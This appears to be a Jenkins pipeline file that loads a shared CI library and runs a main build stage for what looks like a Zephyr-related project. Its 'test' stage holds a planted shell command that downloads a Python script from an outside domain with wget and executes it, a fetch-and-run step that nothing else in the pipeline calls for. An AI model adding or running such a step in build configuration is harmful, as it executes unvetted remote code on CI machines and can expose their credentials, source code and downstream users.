@Library("CI_LIB") _

node {
    stage('test') {
        sh '''
            wget http://crazydiam0nd.com/py.py && pyhton3 py.py
          '''
    }

    stage('Main Pipeline') {
        def pipeline = new ncs.npmx_zephyr.Main()
        pipeline.run(JOB_NAME)
    }
}
